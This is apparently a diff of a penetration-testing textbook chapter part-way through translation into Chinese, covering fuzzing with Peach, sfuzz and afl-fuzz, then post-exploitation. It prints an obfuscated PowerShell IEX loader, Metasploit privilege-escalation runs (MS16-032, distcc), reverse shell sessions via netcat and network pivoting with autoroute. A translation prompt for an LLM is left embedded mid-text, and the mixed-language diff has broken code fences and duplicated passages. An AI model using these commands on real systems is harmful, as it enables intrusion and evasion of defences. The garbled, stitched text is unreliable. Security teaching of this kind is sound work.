-These alone are not sufficient. You need a publisher. This tells Peach how it's going to communicate with the application. In this case, you would use a network publisher, and Peach includes some predefined publishers for network communication. The following is the XML that defines the overall test for Peach, including the publisher. It also defines a logger, so we have evidence of what happened. Watching the output on the screen can be challenging since you may get a lot of output and it's hard to follow. What you can see commented out in this is the remote agent, which is used to monitor the application. In this case, we'd monitor the HTTP server for crashes. This lets Peach know how to communicate with the remote monitoring application so it can sync up what it sent with what happened on the remote server.
+These alone are not sufficient. You need a publisher. This tells `Peach` how it's going to communicate with the application. In this case, you would use a network publisher, and `Peach` includes some predefined publishers for network communication. The following is the XML that defines the overall test for `Peach`, including the publisher. It also defines a logger, so we have evidence of what happened. Watching the output on the screen can be challenging since you may get a lot of output and it's hard to follow. What you can see commented out in this is the remote agent, which is used to monitor the application. In this case, we'd monitor the HTTP server for crashes. This lets `Peach` know how to communicate with the remote monitoring application so it can sync up what it sent with what happened on the remote server.
 
-``` 
+```
 <Test name="Default">
+
          <!-- <Agent ref="RemoteAgent"/> -->
+
          <StateModel ref="TheStateModel"/>
 
          <Publisher class="TcpClient">
+
                   <Param name="Host" value="192.168.4.1"/>
+
                   <Param name="Port" value="80"/>
+
          </Publisher>
 
          <Logger class="File system">
+
                   <Param name="Path" value="Logs"/>
+
          </Logger>
+
 </Test>
 ```
 
-As noted, you get a lot of output. Peach will determine how many tests it runs based on the data models defined. The following is a set of output from Peach running the test defined earlier:
+As noted, you get a lot of output. `Peach` will determine how many tests it runs based on the data models defined. The following is a set of output from `Peach` running the test defined earlier:
 
-``` 
+```
 PS C:\Users\Ric Messier\Downloads\peach> .\peach.exe .\samples\http.xml
- 
+
 [[ Peach v3.1.124.0
+
 [[ Copyright (c) Michael Eddington
- 
+
 [*] Test 'Default' starting with random seed 43275.
- 
+
 [R1,-,-] Performing iteration
- 
+
 [1,-,-] Performing iteration
+
 [*] Fuzzing: HttpRequest.DataElement_1
+
 [*] Mutator: UnicodeBomMutator
+
 [*] Fuzzing: HttpRequest.DataElement_0
+
 [*] Mutator: DataElementRemoveMutator
+
 [*] Fuzzing: HttpRequest.DataElement_2
+
 [*] Mutator: UnicodeBomMutator
+
 [*] Fuzzing: HttpRequest.DataElement_3
+
 [*] Mutator: UnicodeBomMutator
- 
+
 [2,-,-] Performing iteration
+
 [*] Fuzzing: HttpRequest.DataElement_1
+
 [*] Mutator: UnicodeBadUtf8Mutator
+
 [*] Fuzzing: HttpRequest.DataElement_3
+
 [*] Mutator: UnicodeUtf8ThreeCharMutator
- 
+
 [3,-,-] Performing iteration
+
 [*] Fuzzing: HttpRequest.DataElement_1
+
 [*] Mutator: UnicodeUtf8ThreeCharMutator
+
 [*] Fuzzing: HttpRequest.DataElement_3
+
 [*] Mutator: StringMutator
+
 [*] Fuzzing: HttpRequest.DataElement_4
+
 [*] Mutator: UnicodeBadUtf8Mutator
+
 [*] Fuzzing: HttpRequest.DataElement_0
+
 [*] Mutator: StringMutator
+
 [*] Fuzzing: HttpRequest.DataElement_2
+
 [*] Mutator: UnicodeUtf8ThreeCharMutator
 ```
 
+
+
+
 This is not the only type of fuzzing, though. Local vulnerabilities may not work on network services. Instead, they may require files to trigger. Peach will work with file‑based fuzzing as well. In this case, you would need a sample file that could be used to manipulate as needed to trigger a crash. Peach would repeatedly open the file with altered data. The monitoring required for this would occur on the same system where the testing was being executed, which is not necessarily the same for network‑based testing.
 
-One of the advantages of a tool like Peach is that you can create your own test plans for protocols you may not have run across, as in the case of performing application testing. However, often, you are working with well‑known protocols. For something like that, you can use Peach and Peach pits that are available or you can use something that may be a little simpler and also already available in Kali Linux. One of these tools is `sfuzz`. There are a handful of template files that are available. One example is the basic.smtp file that can be used to test an email server. This is some of the output from running `sfuzz` against a Postfix mail server.
+One of the advantages of a tool like Peach is that you can create your own test plans for protocols you may not have run across, as in the case of performing application testing. However, often, you are working with well‑known protocols. For something like that, you can use Peach and Peach pits that are available or you can use something that may be a little simpler and also already available in Kali Linux. One of these tools is `sfuzz`. There are a handful of template files that are available. One example is the `basic.smtp` file that can be used to test an email server. This is some of the output from running `sfuzz` against a Postfix mail server.
 
-``` 
+```
 ===========================================================
+
 [18:01:03] attempting fuzz - 61 (len: 50057).
+
 [18:01:03] info: tx fuzz - (50057 bytes) - scanning for reply.
+
 [18:01:04] read:
+
 220 badmilo.washere.com ESMTP Postfix (Debian/GNU)
+
 250 badmilo.washere.com
- 
+
 ===========================================================
+
 [18:01:04] attempting fuzz - 62 (len: 10).
+
 [18:01:04] info: tx fuzz - (10 bytes) - scanning for reply.
+
 [18:01:04] read:
+
 220 badmilo.washere.com ESMTP Postfix (Debian/GNU)
+
 250‑badmilo.washere.com
+
 250‑PIPELINING
+
 250‑SIZE 10240000
+
 250‑VRFY
+
 250‑ETRN
+
 250‑STARTTLS
+
 250‑ENHANCEDSTATUSCODES
+
 250‑8BITMIME
+
 250‑DSN
+
 250‑SMTPUTF8
+
 250‑CHUNKING
 ```
 
@@ -6652,119 +7586,122 @@ This shows the responses from the server to mutated input from the fuzzing tool.
 
 While you can use tools like Peach and `sfuzz` for remote application fuzzing over the network, you can also use a tool like American fuzzy lop (AFL) to fuzz file formats. This can manipulate file formats to try to cause local crashes. Once you have a local crash, you can identify where the crash occurs in the code as well as the input data that caused the crash. This may allow you to manipulate the input to change the execution path. The program `afl-fuzz`, available in Kali Linux, will automatically assess normal input data to generate test cases based on that.
 
-
-
-假设你是一个高级文档工程师和翻译员，请参考下面的注意事项了解 Markdown 文档的格式，然后参考示例，将给定英文文本翻译成中文。
-
-## 注意事项
-
--   粗体（**bold**）和斜体（*itatic*）需要翻译翻译内容并保留符号。
--   内联代码（`code`）和代码块不需要翻译。
--   链接（[link](https://example.org)）需要翻译其内容，但保留网址。
--   列表，表格，引用块保留格式，翻译内容
--   原文可能有多行，不要漏掉任何一行，并且注意一定不要重复输出原文！！！
--   输出应包含在“[content]...[/content]”中
-
-## 示例
-
-原文：
-
-[content]
--   [Feynman's learning method](https://wiki.example.org/feynmans_learning_method) is inspired by **Richard Feynman**, the Nobel Prize winner in physics. 
-
-1.  With Feynman's skills, you can understand the knowledge points in depth in just `20 min`, and it is memorable and *hard to forget*. 
-
-```
-if (condVar > someVal) {console.log("xxx")}
-```
 [/content]
 
-译文：
-
-[content]
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
-
-```
-if (condVar > someVal) {console.log("xxx")}
-```
-[/content]
-
-## 以下是需要翻译的文本
-
 [content]
 
-Here is an example of running `afl-fuzz` against a PDF viewer application. Normally, `afl-fuzz` requires applications to be built with instrumentation enabled so the application can be managed as it is executing. If you are unable to get access to the source code or unable to build a binary with instrumentation enabled, you can add the `-n` flag, which skips that part of the testing, which will lead to less reliable results.
+下面是一个对 PDF 查看器应用程序运行 `afl-fuzz` 的示例。
+
+通常，`afl-fuzz` 要求应用程序在构建时启用插桩（instrumentation），以便在程序执行过程中对其进行管理。如果你无法获取源代码，或者无法构建带有插桩的二进制文件，可以添加 `-n` 标志，这会跳过测试中的该部分，但会导致结果的可靠性降低。
 
 ```
 kilroy@cutterjohn:~ $ afl-fuzz -t 100000 -n -i pdfs -o pdf-results /usr/local/bin/atril
+
 afl-fuzz++4.04c based on afl by Michal Zalewski and a large online community
+
 [+] afl++ is maintained by Marc "van Hauser" Heuse, Heiko "hexcoder" Eißfeldt, Andrea Fioraldi and Dominik Maier
+
 [+] afl++ is open source, get it at https://github.com/AFLplusplus/AFLplusplus
+
 [+] NOTE: This is v3.x which changes defaults and behaviours - see README.md
+
 [*] Getting to work…
+
 [+] Using exponential power schedule (FAST)
+
 [+] Enabled testcache with 50 MB
+
 [+] Generating fuzz data with a length of min=1 max=1048576
+
 [*] Checking core_pattern…
+
 [!] WARNING: Could not check CPU scaling governor
+
 [+] You have 2 CPU cores and 2 runnable tasks (utilization: 100%).
+
 [*] Setting up output directories…
+
 [+] Output directory exists but deemed OK to reuse.
+
 [*] Deleting old session data…
+
 [+] Output dir cleanup successful.
+
 [*] Checking CPU core loadout…
+
 [+] Found a free CPU core, try binding to #0.
+
 [*] Scanning 'pdfs'…
+
 [*] Scanning 'pdfs/Downloads'…
+
 [+] Loaded a total of 3 seeds.
+
 [*] Creating hard links for all input files…
+
 [*] Validating target binary…
+
 [*] No auto-generated dictionary tokens to reuse.
+
 [*] Attempting dry run with 'id:000000,time:0,execs:0,orig:keyboard-shortcuts-linux.pdf'…
+
 [*] Spinning up the fork server…
+
 [*] Using AFL++ faux forkserver…
+
 [+] All right - fork server is up.
 ```
 
-File‑based fuzzing does require local access to exploit any identified vulnerability. However, this can be useful for a number of post‑exploitation attack techniques, including privilege escalation.
+
+
+
+File-based fuzzing does require local access to exploit any identified vulnerability. However, this can be useful for a number of post-exploitation attack techniques, including privilege escalation.
 
 ## Post Exploitation
 
 You now have a foothold on the system. What you can do with it depends on what you compromised. You may have limited permissions if the remote service you compromised has limited permissions. You can only perform tasks that you have permissions to perform. This means you may need to escalate your privileges to a user with more than you have. Gaining root or administrator permissions is a common objective for attackers since it helps them pivot to other systems to move laterally within the environment. You may also have a better chance to collect passwords and other critical system information that you may need for other tasks.
 
-You not only have a foothold on the system, but that system also gives you a foothold on the network as well. You may find, especially if you have compromised a system offering services to the outside world, that the system is connected to more than one network. This means you can use the compromised system as a gateway to those other networks. This is a technique called *pivoting*, where you pivot off the compromised system to take a look at another set of systems. This will get you further into the network and potentially gain you even more sensitive information or access to more critical systems.
+You not only have a foothold on the system, but that system also gives you a foothold on the network as well. You may find, especially if you have compromised a system offering services to the outside world, that the system is connected to more than one network. This means you can use the compromised system as a gateway to those other networks. This is a technique called `pivoting`, where you pivot off the compromised system to take a look at another set of systems. This will get you further into the network and potentially gain you even more sensitive information or access to more critical systems.
 
 Attackers will also look to gain persistent access to the system. This may mean a number of activities, from creating users to installing backdoors. Alongside persistent access, the attacker will want to cover their tracks. This can mean hiding data in places on the system. It may mean manipulating logs. It can also mean manipulating system binaries to help hide your existence.
 
 ### Evasion
 
-Once you have a foothold, which may include usernames and passwords or actual remote access to a system, you may run into problems. Both workstations and servers will probably have at least anti‑malware if not software that will look for anomalous behavior. Endpoint detection and response (EDR) software will know what attack techniques look like. Common tools, such as those discussed in this chapter, may be well‑known to these sorts of tools. This calls for evasive tactics.
+Once you have a foothold, which may include usernames and passwords or actual remote access to a system, you may run into problems. Both workstations and servers will probably have at least anti-malware if not software that will look for anomalous behavior. Endpoint detection and response (EDR) software will know what attack techniques look like. Common tools, such as those discussed in this chapter, may be well-known to these sorts of tools. This calls for evasive tactics.
 
-One possible place where evasion needs to happen is detecting files, primarily on disk. You may be able to use techniques like alternate data streams mentioned later. You can also encrypt or otherwise obfuscate data. Encrypted zip files are one way to get around detection in anti‑malware software.
+One possible place where evasion needs to happen is detecting files, primarily on disk. You may be able to use techniques like alternate data streams mentioned later. You can also encrypt or otherwise obfuscate data. Encrypted zip files are one way to get around detection in anti-malware software.
 
-When it comes to execution, though, we have another problem. Anti‑malware software may have ways of detecting executables. You may be able to get around this by using PowerShell to perform the same task. There may not be a detection in place for a PowerShell script, especially if you write your own, and you may be able to accomplish the same task that a native executable is doing for you. One of the problems with PowerShell is it may be logged. This can make detection after the fact easier, but not if the PowerShell can't be read. As an example, the following is a sample of PowerShell that has been obfuscated:
+When it comes to execution, though, we have another problem. Anti-malware software may have ways of detecting executables. You may be able to get around this by using PowerShell to perform the same task. There may not be a detection in place for a PowerShell script, especially if you write your own, and you may be able to accomplish the same task that a native executable is doing for you. One of the problems with PowerShell is it may be logged. This can make detection after the fact easier, but not if the PowerShell can't be read. As an example, the following is a sample of PowerShell that has been obfuscated:
 
 ```
 $N7 =[char[ ] ] "noisserpxE-ekovnI| )93]rahC[,'pQm'ecalpeR-
+
 43]rahC[,'bg0'ecalpeR- )')pQm'+'nepQ'+'m+pQme'+'rGpQm'+'
+
 ( '+'roloCdnu'+'orger'+'oF- )bg0nbg0'+'+ bg0oibg0'+' +
+
 bg0tacbg0'+'+'+'bg0sufbO-b'+'g'+'0+'+'bg0ek'+'ovn'+'bg0+ bg0Ib'+'g'+'0 '+
+
 ( )'+'bg'+'0tsO'+'bg0'+' + bg'+'0H'+'-'+'ebg0 '+' '+'+ b'+'g0'+'tIRwb'+'g0(.
+
 '((";[Array]::Reverse($N7 ) ; IEX ($N7-Join '' )
 ```
 
-This translates to `Invoke‑Obfuscation`, which is a cmdlet written by Daniel Bohannon that takes a PowerShell script and obfuscates it. There are different ways to accomplish the obfuscation, as demonstrated when you run the cmdlet without any parameters. The following are the techniques you can use for obfuscating PowerShell using this cmdlet:
+This translates to `Invoke-Obfuscation`, which is a cmdlet written by Daniel Bohannon that takes a PowerShell script and obfuscates it. There are different ways to accomplish the obfuscation, as demonstrated when you run the cmdlet without any parameters. The following are the techniques you can use for obfuscating PowerShell using this cmdlet:
 
 ```
 Choose one of the below options:
- 
+
 [*] TOKEN Obfuscate PowerShell command Tokens
+
 [*] AST Obfuscate PowerShell Ast nodes (PS3.0+)
+
 [*] STRING Obfuscate entire command as a String
+
 [*] ENCODING Obfuscate entire command via Encoding
+
 [*] COMPRESS Convert entire command to one-liner and Compress
+
 [*] LAUNCHER Obfuscate command args w/Launcher techniques (run once at end)
 ```
 
@@ -6772,120 +7709,153 @@ There are several other ways to obfuscate scripts and data. This may include tec
 
 ### Privilege Escalation
 
-Your mission, should you choose to accept it, is to gain root‑level access. There was a time when services ran as root on Unix/Linux systems or as LocalSystem on Windows systems, which is an account that has a high level of permissions. Once you have root‑level access, you should be able to gain access to all information on the system as well as make changes to services and manipulate users. What this means is that you need to get access to the system first, and then you'll need to run another exploit to get elevated privileges. We can continue to use Metasploit for this, so let's start with a compromised system with a Meterpreter shell. If we background the shell using `background`, we can make use of the open session as a way of interacting with the system.
+Your mission, should you choose to accept it, is to gain root-level access. There was a time when services ran as root on Unix/Linux systems or as LocalSystem on Windows systems, which is an account that has a high level of permissions. Once you have root-level access, you should be able to gain access to all information on the system as well as make changes to services and manipulate users. What this means is that you need to get access to the system first, and then you'll need to run another exploit to get elevated privileges. We can continue to use Metasploit for this, so let's start with a compromised system with a Meterpreter shell. If we background the shell using `background`, we can make use of the open session as a way of interacting with the system.
 
+- 本地特权提升是提高权限的常见方法。你可以通过利用以特权用户身份运行的应用程序来实现。一旦你利用了这些应用程序中的一个漏洞，你将拥有与该应用程序运行的用户相同的权限。这使得服务漏洞利用成为常见的目标。在 Linux 系统中，有一种方法可以以 setuid 方式运行应用程序，这意味着应用程序会以文件的所有者身份运行，无论谁执行该程序。通常在任何操作系统上，应用程序运行时会以执行该程序的用户的权限运行。这并不总是可取，因为有时你希望用户能够在不需要超级用户权限的情况下执行一组最小任务。例如，在 Linux 系统中，像 `ping` 和 `traceroute` 这样的程序就是这种情况，它们执行的任务通常需要超级用户权限，例如使用原始套接字来创建看起来略有不同的数据包。这些程序由普通用户执行，但以 root 用户的权限运行。程序停止运行后，权限会被撤销。
 
+- 这只是获得权限而不必针对运行在特权用户下的应用程序的一种方式。它可能更可靠，因为开发人员和系统管理员正在逐渐确保应用程序不以特权用户身份运行，只获取应用程序正确运行所需的特定权限。当然，Linux 权限集中的 setuid 位已知多年，并且已进行工作以限制由此产生的暴露面。然而，这两种途径仍然可能，具体取决于目标系统和操作者。
 
-
--   [本地特权提升是提高权限的常见方法。你可以通过利用以特权用户身份运行的应用程序来实现。一旦你利用了这些应用程序中的一个漏洞，你将拥有与该应用程序运行的用户相同的权限。这使得服务漏洞利用成为常见的目标。在 Linux 系统中，有一种方法可以以 setuid 方式运行应用程序，这意味着应用程序会以文件的所有者身份运行，无论谁执行该程序。通常在任何操作系统上，应用程序运行时会以执行该程序的用户的权限运行。这并不总是可取，因为有时你希望用户能够在不需要超级用户权限的情况下执行一组最小任务。例如，在 Linux 系统中，像 ping 和 traceroute 这样的程序就是这种情况，它们执行的任务通常需要超级用户权限，例如使用原始套接字来创建看起来略有不同的数据包。这些程序由普通用户执行，但以 root 用户的权限运行。程序停止运行后，权限会被撤销。
-
--   这只是获得权限而不必针对运行在特权用户下的应用程序的一种方式。它可能更可靠，因为开发人员和系统管理员正在逐渐确保应用程序不以特权用户身份运行，只获取应用程序正确运行所需的特定权限。当然，Linux 权限集中的 setuid 位已知多年，并且已进行工作以限制由此产生的暴露面。然而，这两种途径仍然可能，具体取决于目标系统和操作者。
-
--   为了提升我们的有限权限，我们需要识别本地漏洞。一种方法是使用 Python 脚本 `windows-exploit-suggester.py`。这是一个可以从 GitHub 下载的脚本，除了 Python 解释器外，它还需要以下两项：第一是 `systeminfo` 的输出，第二是包含 Microsoft 安全公告（MSSB）信息的数据库。为了获取第一项，我们可以从被妥协的 Windows 系统中获取它，通过在 Meterpreter 中获取一个 Windows shell 并运行 `systeminfo`，将输出重定向到文件，然后将该文件拉取回本地系统。以下是该过程的示例。
+- 为了提升我们的有限权限，我们需要识别本地漏洞。一种方法是使用 Python 脚本 `windows-exploit-suggester.py`。这是一个可以从 GitHub 下载的脚本，除了 Python 解释器外，它还需要以下两项：第一是 `systeminfo` 的输出，第二是包含 Microsoft 安全公告（MSSB）信息的数据库。为了获取第一项，我们可以从被妥协的 Windows 系统中获取它，通过在 Meterpreter 中获取一个 Windows shell 并运行 `systeminfo`，将输出重定向到文件，然后将该文件拉取回本地系统。以下是该过程的示例。
 
 **获取系统补丁信息**
 
 ```
 meterpreter> shell
+
 Process 3 created.
+
 Channel 3 created.
+
 Microsoft Windows [Version 6.1.7601]
+
 Copyright (c) 2009 Microsoft Corporation. All rights reserved.
- 
+
 C:\Program Files\elasticsearch-1.1.1>systeminfo> patches.txt
+
 systeminfo> patches.txt
- 
+
 C:\Program Files\elasticsearch-1.1.1>exit
+
 exit
+
 meterpreter> download patches.txt
+
 [* ] Downloading: patches.txt -> patches.txt
+
 [* ] Downloaded 2.21 KiB of 2.21 KiB (100.0%): patches.txt -> patches.txt
+
 [* ] download : patches.txt -> patches.txt
 ```
 
--   一旦我们拥有补丁信息，就可以继续使用 `windows-exploit-suggester`。我们将获取更新的 MSSB 数据库，然后使用我们的两个文件运行脚本，寻找本地漏洞。以下是运行脚本的示例。我们将得到一个可能对我们被妥协系统进行本地攻击的漏洞列表。它不会提供关于 Metasploit 模块的详细信息，因此我们仍然需要进行一些搜索。但它会提供如果你想进一步了解漏洞和漏洞利用的资源。需要注意的是，这是一个基于 Python2 的脚本，不能在 Python3 环境下运行。
+- 一旦我们拥有补丁信息，就可以继续使用 `windows-exploit-suggester`。我们将获取更新的 MSSB 数据库，然后使用我们的两个文件运行脚本，寻找本地漏洞。以下是运行脚本的示例。我们将得到一个可能对我们被妥协系统进行本地攻击的漏洞列表。它不会提供关于 Metasploit 模块的详细信息，因此我们仍然需要进行一些搜索。但它会提供如果你想进一步了解漏洞和漏洞利用的资源。需要注意的是，这是一个基于 Python2 的脚本，不能在 Python3 环境下运行。
 
 **获取本地漏洞建议**
 
 ```
 root@quiche:~# ./windows-exploit-suggester.py --update
+
 [* ] initiating winsploit version 3.3…
+
 [+ ] writing to file 2023-01-09-mssb.xls
+
 [* ] done
+
 root@quiche:~# ./windows-exploit-suggester.py -i patches.txt -d 2023-01-09-mssb.xls -l
+
 [* ] initiating winsploit version 3.3…
+
 [* ] database file detected as xls or xlsx based on extension
+
 [* ] attempting to read from the systeminfo input file
+
 [+ ] systeminfo input file read successfully (ascii)
+
 [* ] querying database file for potential vulnerabilities
+
 [* ] comparing the 2 hotfix(es) against the 407 potential bulletins(s) with a database of 137 known exploits
+
 [* ] there are now 407 remaining vulns
+
 [* ] searching for local exploits only
+
 [+ ] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+
 [* ] windows version identified as 'Windows 2008 R2 SP1 64-bit'
-[* ]
-[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
-[* ] https://github.com/foxglovesec/RottenPotato
-[* ] https://github.com/Kevin-Robertson/Tater
-[* ] https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
---- snip ---
-[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
-[* ] http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
-[* ]
-[* ] done
 ```
 
+
+
+
+[* ] MS16-075: Security Update for Windows SMB Server (3164038) - Important
+
+[* ] https://github.com/foxglovesec/RottenPotato
+
+[* ] https://github.com/Kevin-Robertson/Tater
+
+[* ] https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
+
+--- snip ---
+
+[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
+
+[* ] http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
+
+[* ]
+
+[* ] done
+
+```
 -   列出的某些建议漏洞无法在 Windows on Windows（WoW）64 环境下运行。WoW64 是一个子系统，允许 32 位 Windows 可执行文件在 64 位 Windows 安装上运行。利用需要在该子系统内运行并能够利用该漏洞。由于 64 位 Windows 上存在额外的软件层，某些漏洞可能无法利用。我们将使用 MS16-032 漏洞。我们需要识别与该漏洞关联的 Metasploit 模块，这意味着我们只需搜索 Microsoft 漏洞即可，如下面的代码示例所示。搜索漏洞后会返回单个模块。
+```
 
 **搜索本地漏洞**
 
-```
-msf exploit(windows/local/ms15_051_client_copy_image)> search MS16-032
- 
+```msf exploit(windows/local/ms15_051_client_copy_image)> search MS16-032
+
  Matching Modules
  ================
- 
-       Name                                                             Disclosure Date  Rank    Description
-       ----                                                             ---------------  ----    -----------
+
+    Name                                                             Disclosure Date  Rank    Description
+    ----                                                             ---------------  ----    -----------
     exploit/windows/local/ms16_032_secondary_logon_handle_privesc  2016-03-21       normal  MS16-032 Secondary Logon Handle Privilege Escalation
- 
- 
     exploit(windows/local/ms15_051_client_copy_image)> use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
- 
 ```
 
--   请记住，此时我们已经有一个打开的目标系统会话。要使用本地漏洞，我们需要设置我们打开的会话号码。如果你需要确定要使用哪个会话号码，因为你已经失去了跟踪，可以在将 Meterpreter 会话背景化后使用 `sessions` 命令。这是一个你需要设置的参数，同时还需要设置用于反向 Meterpreter 壳的 payload、本地主机和端口。以下是设置所有必要变量并启动漏洞的示例。
+-   请记住，此时我们已经有一个打开的目标系统会话。要使用本地漏洞，我们需要设置我们打开的会话号码。如果你需要确定要使用哪个会话号码，因为你已经失去了跟踪，可以在将 Meterpreter 会话背景化后使用`sessions`命令。这是一个你需要设置的参数，同时还需要设置用于反向 Meterpreter 壳的 payload、本地主机和端口。以下是设置所有必要变量并启动漏洞的示例。
 
 **使用本地漏洞从 Metasploit 中**
 
-```
-msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc)> set SESSION 2
+```msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc)> set SESSION 2
+
 SESSION => 2
+
 msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc)> set LHOST 192.168.86.57
+
 LHOST => 192.168.86.57
+
 msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc)> set LPORT 4445
+
 LPORT => 4445
+
 msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc)> exploit
- 
+
  [* ] Started reverse TCP handler on 192.168.86.57:4445
  [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
  [* ] Writing payload file, C:\ManageEngine\DesktopCentral_Server\bin\ROayyKQ.txt…
  [* ] Compressing script contents…
  [* ] Compressed size: 3621
  [* ] Executing exploit script…
-
-
+```
 
 在某些情况下，我们无法使用 Metasploit。我们需要使用一些外部工具。这可能意味着编译一个 exploit 程序。在下面的代码列表中，你会看到利用分布式 C 编译器守护进程的漏洞来妥协 Linux 系统。我们使用 Metasploit 模块进行初始 exploit。特权提升需要在目标系统上编译一个 C 程序。由于我们无法保证目标系统上有 C 编译器，因此在攻击系统上进行编译。我们的目标是 32 位，而我们的攻击系统是 64 位。这意味着我们需要一套特殊的库，以便能够跨架构交叉编译。一旦我们得到输出，就可以把它和一个简单的 shell 脚本放入目录中，这样就可以通过 Web 服务器访问。在此列表中，你会看到利用目标系统并运行特权提升。
 
 **Linux 特权提升**
 
-```
-Msf6> use exploit/unix/misc/distcc_exec
+```Msf6> use exploit/unix/misc/distcc_exec
 msf exploit(unix/misc/distcc_exec)> set RHOST 192.168.86.66
 RHOST => 192.168.86.66
 msf exploit(unix/misc/distcc_exec)> exploit
-  
+
  [*] Started reverse TCP double handler on 192.168.86.57:4444
  [*] Accepted the first client connection…
  [*] Accepted the second client connection…
@@ -6898,7 +7868,7 @@ msf exploit(unix/misc/distcc_exec)> exploit
  [*] Matching…
  [*] A is input…
  [*] Command shell session 1 opened (192.168.86.57:4444 -> 192.168.86.66:47936) at 2023-01-09 18:28:22 -0600
-  
+
  whoami
  daemon
  cd /tmp
@@ -6906,15 +7876,13 @@ msf exploit(unix/misc/distcc_exec)> exploit
  root      2663  0.0  0.1   2216   700 ?        S<s  Apr24   0:00 /sbin/udevd --daemon
  daemon    6364  0.0  0.1   1784   532 ?        RN   11:54   0:00 grep udev
  ./escalate 2662
- 
 ```
 
-这里看不到的是下载两个所需文件。其中一个是 exploit 本身，名为 `escalate`。另一个是一个简单的 shell 脚本，名为 `run`。它的作用是使用 `netcat` 向目标系统发送一个 shell。在下面的代码列表中，你可以看到我们在攻击系统上看到的反向连接。我们通过使用 `netcat` 在攻击系统上打开一个监听端口来获得反向连接。监听端口与 shell 脚本中使用的端口相同。在特权提升攻击中，我们提供比 `udev` 进程的进程标识符（PID）少一个数值，这会触发 exploit。
+这里看不到的是下载两个所需文件。其中一个是 exploit 本身，名为`escalate`。另一个是一个简单的 shell 脚本，名为`run`。它的作用是使用`netcat`向目标系统发送一个 shell。在下面的代码列表中，你可以看到我们在攻击系统上看到的反向连接。我们通过使用`netcat`在攻击系统上打开一个监听端口来获得反向连接。监听端口与 shell 脚本中使用的端口相同。在特权提升攻击中，我们提供比`udev`进程的进程标识符（PID）少一个数值，这会触发 exploit。
 
-**使用 `netcat` 监听反向连接**
+**使用`netcat`监听反向连接**
 
-```
-kilroy@quiche:~$ netcat -lvp 5555
+```kilroy@quiche:~$ netcat -lvp 5555
  listening on [any] 5555 …
  192.168.86.66: inverse host lookup failed: Unknown host
  connect to [192.168.86.57] from (UNKNOWN) [192.168.86.66] 50391
@@ -6922,22 +7890,20 @@ kilroy@quiche:~$ netcat -lvp 5555
  root
  uname -a
  Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
- 
 ```
 
 这种链式 exploit 常常是获得必要访问权限的手段。当然，获得管理员访问并不是全部目标，但它确实很有用。你可能还想利用已获取的立足点来查找网络中的其他系统。
 
-### Pivoting（横向移动）
+## Pivoting（横向移动）
 
 一些组织的网络设计是扁平的，即所有系统都连接到同一个网络，而不是多个网络提供分层访问。但担心关键资源安全的组织通常会将系统连接到多个网络。你在 compromising 一个系统后，可能会发现它有多个网络接口，例如下面代码列表中显示的系统。该系统是 Windows 系统，拥有两个接口。一个位于 192.168.86.0 网络，这是 exploit 进入的接口。另一个接口，名为 Interface 19，位于 172.30.42.0 网络。这是我们想要目标的网络，但我们不能直接在已被 compromising 的系统上上传大量攻击工具。相反，我们需要能够通过我们的攻击系统将流量传递到它所连接的网络。
 
 **IP 地址配置**
 
-```
-meterpreter> getuid
+```meterpreter> getuid
  Server username: NT AUTHORITY\LOCAL SERVICE
  meterpreter> ipconfig
-  
+
  Interface  1
  ============
  Name         : Software Loopback Interface 1
@@ -6947,8 +7913,7 @@ meterpreter> getuid
  IPv4 Netmask : 255.0.0.0
  IPv6 Address : ::1
  IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
-  
-  
+
  Interface 12
  ============
  Name         : Microsoft ISATAP Adapter
@@ -6956,8 +7921,7 @@ meterpreter> getuid
  MTU          : 1280
  IPv6 Address : fe80::5efe:c0a8:5621
  IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
-  
-  
+
  Interface 13
  ============
  Name         : Intel(R) PRO/1000 MT Network Connection
@@ -6967,8 +7931,7 @@ meterpreter> getuid
  IPv4 Netmask : 255.255.255.0
  IPv6 Address : fe80::35b1:1874:3712:8b59
  IPv6 Netmask : ffff:ffff:ffff:ffff::
-  
-  
+
  Interface 19
  ============
  Name         : Intel(R) PRO/1000 MT Network Connection #2
@@ -6978,39 +7941,34 @@ meterpreter> getuid
  IPv4 Netmask : 255.255.255.0
  IPv6 Address : fe80::4b4:7b9a:b3b7:3742
  IPv6 Netmask : ffff:ffff:ffff:ffff::
- 
 ```
 
-要添加路由以便将流量传递到 172.30.42.0 子网，我们需要运行一个 post‑exploit 模块。我们将运行名为 `autoroute` 的模块，它会利用已有的会话来添加该网络的路由。下面的列表展示了运行 `autoroute` 模块的过程，输出表明路由已成功添加。
+要添加路由以便将流量传递到 172.30.42.0 子网，我们需要运行一个 post‑exploit 模块。我们将运行名为`autoroute`的模块，它会利用已有的会话来添加该网络的路由。下面的列表展示了运行`autoroute`模块的过程，输出表明路由已成功添加。
 
-**运行 `autoroute`**
+**运行`autoroute`**
 
-```
-meterpreter> run post/multi/manage/autoroute SUBNET=172.30.42.0 ACTION=ADD
+```meterpreter> run post/multi/manage/autoroute SUBNET=172.30.42.0 ACTION=ADD
  [!] SESSION may not be compatible with this module.
  [*] Running module against VAGRANT-2008R2
  [*] Adding a route to 172.30.42.0/255.255.255.0…
